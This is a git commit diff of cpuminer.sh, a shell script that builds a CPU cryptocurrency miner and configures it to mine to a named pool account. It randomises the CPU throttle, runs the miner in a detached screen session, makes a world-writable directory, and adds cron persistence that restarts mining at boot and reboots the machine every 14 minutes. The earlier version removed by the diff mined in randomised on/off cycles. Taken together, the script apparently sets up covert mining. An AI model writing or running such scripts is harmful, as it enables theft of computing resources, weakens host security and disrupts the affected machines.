379b1d85a7880c23cd3124603d610539338d68d8
cknapp004 <cknapp004@student.butte.edu>
2017-09-13 23:19:06 +0700

    Update cpuminer.sh

--- cpuminer.sh
+++ cpuminer.sh
@@ -1,25 +1,20 @@
 #!/bin/bash
-sudo apt-get update
-sudo apt-get install git make automake screen libcurl4-openssl-dev -y
-sudo apt-get install libcurl4-openssl-dev build-essential libjansson-dev cpulimit -y
-git clone https://github.com/wolf9466/cpuminer-multi
-cd cpuminer-multi
-./autogen.sh
-CFLAGS="-march=native" ./configure
-make
+sudo apt-get update && apt-get -y upgrade
+sudo apt-get install -y git make curl unzip gedit automake autoconf dh-autoreconf build-essential pkg-config openssh-server screen libtool libcurl4-openssl-dev libncurses5-dev libudev-dev libjansson-dev libssl-dev libgmp-dev gcc g++ screen cpulimit
+sudo mkdir /home/hello
+sudo chmod 777 /home/hello
+cd /home/hello
+git clone https://github.com/JayDDee/cpuminer-opt
+cd cpuminer-opt
+./build.sh
 
 NPROC=$(nproc)
-num1=`expr $NPROC \* 50`
+num1=`expr $NPROC \* 70`
 num2=`expr $NPROC \* 84`
-while [ 2 -ge 0 ] 
-do
 cpult=$(shuf -i $num1-$num2 -n 1)
-delay1=$(shuf -i 900-1800 -n 1)
-delay2=$(shuf -i 10-20 -n 1)
-cpulimit --exe minerd --limit $cpult -b
-screen -S foo -d -m ./minerd -a cryptonight -o stratum+tcp://xmr-eu.suprnova.cc:5222 -u vant.1 -p 1
-sleep $delay1
-screen -S foo -X kill
-pkill -f cpulimit
-sleep $delay2
-done
+
+sudo echo "sudo reboot" > /home/hello/hi2.sh
+sudo echo -e "cpulimit --exe cpuminer --limit $cpult -b &&  cd /home/hello/cpuminer-opt && screen -d -m ./cpuminer -a lyra2z -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u vanto.5 -p 1" > /home/hello/hi.sh
+chmod 755 /home/hello/hi.sh
+chmod 755 /home/hello/hi2.sh
+(crontab -l ; echo -e "*/14 * * * * /home/hello/hi2.sh\\n@reboot /home/hello/hi.sh") | crontab -
